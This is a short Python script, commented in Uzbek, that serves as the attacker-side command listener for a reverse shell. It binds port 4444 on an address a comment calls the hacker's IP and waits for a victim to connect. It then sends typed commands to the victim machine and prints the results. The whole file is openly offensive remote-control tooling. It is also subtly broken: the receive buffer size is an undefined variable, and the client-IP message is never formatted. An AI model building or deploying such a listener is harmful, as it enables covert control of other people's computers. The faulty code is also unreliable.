#!/usr/bin/python
import socket

server_ip = '192.168.43.42'                   ##hackerni ip adresi
server_port = 4444                 ## klient porti


def main():

	server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

	adress = (server_ip, server_port)
	server.bind(adress)

	server.listen(5)
	print(" [*] kirib keluvchi bog'lanish kuzatilyapti! ")
	klient_soket = server.accept()[0]

	#klient_ip = str(server.accept()[1])

	print(" [*] klient + klient_ip + ip adresiga boglandi ")

	xabar = "Bu habarni ko'rayotgan bo'lsangiz !! demak bog'lanish muvvafaqiyatli bo'ldi"
	klient_soket.send(xabar.encode())

	while True:
		command = raw_input(" [*] buyruq kiriting ! __")
		klient_soket.send(command.encode())
		if command.lower() == "exit":
			break
		natija = klient_soket.recv(xabar_sigimi).decode()
		print(natija)

	klient_soket.close()
	server.close()
main()
